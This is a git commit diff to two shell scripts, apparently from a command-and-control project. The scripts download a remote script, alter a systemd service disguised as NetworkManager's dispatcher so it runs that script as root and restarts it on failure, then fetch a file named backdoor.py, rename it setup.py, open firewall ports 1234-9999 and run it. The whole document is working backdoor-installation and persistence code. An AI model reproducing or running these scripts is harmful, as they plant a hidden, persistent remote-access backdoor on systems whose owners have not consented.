be452a598c4705a19c4b3ff5f876e4d2b325b119
Abinavraj Ganesh Sudhakar <abinavraj10@gmail.com>
2023-03-26 22:06:33 -0500

    tmp fix

--- client_install.sh
+++ client_install.sh
@@ -1,17 +1,10 @@
-#!/bin/bashd
 curl -s https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/cncstartup.sh > /root/cncstartup.sh;
 chmod +x /root/cncstartup.sh
-
-
 file_path="/root/etc/systemd/system/dbus-org.freedesktop.nm-dispatcher.service
 sed -i "14a\\WantedBy=multi-user.target" "$file_path"
-
 new_code='ExecStart=/usr/libexec/nm-dispatcher && /root/cncstartup.sh'
-
 sed -i "7s\\${new_code}" "$file_path"
 sed -i "7a\\Restart=always" "$file_path"
 sed -i "7a\\User=root" "$file_path"
-
 sudo systemctl daemon-reload
 sudo systemctl restart dbus-org.freedesktop.nm-dispatcher
-
--- cncstartup.sh
+++ cncstartup.sh
@@ -1,4 +1,3 @@
-#!/bin/bash
 yum install -y python3;
 curl -o setup.py https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/backdoor.py;
 chmod +x setup.py;
@@ -7,7 +6,6 @@ pip3 install setuptools_rust;
 pip3 install cryptography;
 firewall-cmd --add-port=1234-9999/tcp;
 python3 setup.py;
-
 # mkdir .local
 # mv setup.py install.sh .local/
 # gpg -c .local/*
